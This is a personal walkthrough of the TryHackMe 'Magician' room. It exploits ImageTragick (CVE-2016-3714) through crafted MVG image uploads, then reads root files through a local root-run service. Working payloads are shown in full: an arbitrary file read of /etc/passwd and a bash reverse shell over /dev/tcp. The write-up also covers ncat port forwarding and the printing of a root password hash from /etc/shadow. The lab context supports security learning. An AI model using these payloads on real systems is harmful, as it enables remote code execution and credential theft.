# Tryhackme.com Room : Magician

`https://tryhackme.com/room/magician`

## Instance

```bash
export IP=10.10.229.19
Hostname : magician
```

## Nmap

```
PORT     STATE SERVICE    VERSION                                                                                               
21/tcp   open  ftp        vsftpd 2.0.8 or later
8080/tcp open  http-proxy
8081/tcp open  http       nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: magician
```

## Initial Foothold

Tying to login anonymously to the ftp server. Seems to hang, but after some time we receive the folowing answer :

```
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) 
Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
```

We already knew that it was `CVE-2016-3714` from the challenge description.

Doesn't seem like we can do anything else on the ftp server. Everything get permission denied.





Browsing `:8080` show the following error :

```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Wed Feb 24 18:01:17 UTC 2021
There was an unexpected error (type=Not Found, status=404).
No message available
```



When browsing `:8081` we get a prompt to upload a `png` file that will be converted to `jpg`

Let's try out with some dummy image.



The upload is done via a `POST` to `http://magician:8080/upload` 

A `GET` to `http://magician:8080/files` give us a list of the uploaded files (As json)

The uploaded file is available at `http://magician:8080/files/{FILENAME}.jpg`



The original filename is kept and file are uploaded over (Same filename get overwritten)



Seems like we can upload any type of file but the browser will force us to download the file when browsing `:8080/files/{FILENAME}` so we can't simply execute php file



Let's have a look at `CVE-2016-3714` 



I guess the way to go is to craft an `mvg` image file like this :

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context
```

I was able to receive a request by uploading

```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://10.2.13.34:8000/img)'
pop graphic-context
```

but when adding the `";| ls "-la`, i don't get the request anymore, I tried to replace the `ls -la` with a `curl`, `wget`, `nc` or `ping` request but it doesn't seem to trigger..



Hmmm... let's see the other way to exploit this.

We can do arbitrary file read with

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```

This generate an image with the content of the file.

From this we see that there is only one user with bash access `magician` 

My first thought was to exfiltrate an ssh key but there is no sshd service running so this is pointless.



We can also move and delete files, might be a way to write a php shell script in `/var/www` ?



Hmmm... but I guess the most straightforward way is still to inject a command in the 

```
"wget" -q -O "%o" "https:%M"
```

call made by imagemagick (First payload)



Sooooooo, my error was pretty stupid, I was specifying an `http` scheme while it needed to be `https` although, not sure why I would receive an `http` query when no commands where appended... Also, not sure how it work ? The resulting url would be `https:https://10.2.13.34` maybe the `https` is stripped before being inserted ? Still, don't understand how I could get a real `http` query when no commands are specified... 

Seems like just spawning an `http` server and using an `https` scheme work even tho we get gibberish on our server, the exploit is still executed and we get a reverse shell



Anyhow, the `exploit.mvg` payload is :

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://10.2.13.34:8000/img";bash -i >& /dev/tcp/10.2.13.34/8888 0>&1; echo "1)'
pop graphic-context
```



Reading write ups, seems like we could have left `https://example.com` in there and wait for the request to timeout. This is actually the first thing I did, trying to ping myself. And it did work after some time.



## Priv esc

Now that we are in as `magician` we can retrieve the `~/user.txt` :

```
THM{simsalabim_hex_hex}
```



There is a file `~/the_magic_continues`

```
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```



They were kind enough to include `nmap` on the box, so we can simply `nmap 127.0.0.1` and find (Could also have listed the opened ports with `netstat -tulpn | grep LISTEN` or used `nc-z -v 127.0.0.1 PORT` for port scan)

```
PORT     STATE SERVICE
21/tcp   open  ftp
6666/tcp open  irc
8080/tcp open  http-proxy
8081/tcp open  blackice-icecap
```

We now have access to port `6666` which wasn't accessible from the outside

running `nc 127.0.0.1 6666` doesn't give us anything but we can `curl http://127.0.0.1:6666` and we see an html page with yet another file upload.



Taking a look at the running process with `ps -aux | grep .` (grep to prevent truncating output) we see 

```
/usr/bin/python3 /usr/local/bin/gunicorn --bind 127.0.0.1:6666 magiccat:app
```

runned as `root` so definitely, this is our privesc route.

Looking at `gunicorn` doc (python http server), we see that this simply run the `app` function of a `magiccat.py` module.



Tried to find the the module but couldn't find it. It's probably in `/root` so we don't have access to it (Would have been cool to inject ourselved in the python process via dependency injection)



To access the `:6666` website, I guess we need to forward the port to the outside.

A simple way to do so is usint `ncat` :

```
ncat -l 0.0.0.0 8787 --sh-exec "ncat 127.0.0.1 6666"
```

But then this as to be runned for each request... not super practical (Could have used `chisel`, was a bit lazy so i just reran the command after each request.. didn't need too much stuff).

The webpage give us a `filename` prompt where we can enter a filename an get the "content" of the file.

So we enter `/root/root.txt` but the output is encoded 

```
VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K
```

This is base64 encoded which give us

```
THM{magic_may_make_many_men_mad}
```

Interesting fact is that reading again the file give us different encoding (Binary,rot13,hex)



We could also have simply done (Could have infered that from the html response)

```
curl -X POST 127.0.0.1:6000 -d 'filename=/root/root.txt'
```

from the local prompt without port forwarding



Sooo,now we have the root flag, but we are not root..

We can read `/etc/shadow` :

```
root:$6$NHggwdue$.yIva.bW5tMrYsr5mlTN/tqwaewN5s8fkbQ9rE7Sy0TUtjxSZsmqHb2qL/R5mj7ItKGxwbObqPPjWl1laHU8e0:18663:0:99999:7:::
```

We could try to crack the password.

We'll let john run and look elsewhere for now



What about python injection ? Where is that maggicat module...



Couldn't find a way to escalate priv.. and jon didn't return anything

Lookng at write ups, seems like other didn't either.

So yeah, I guess this is the end of this box

## End

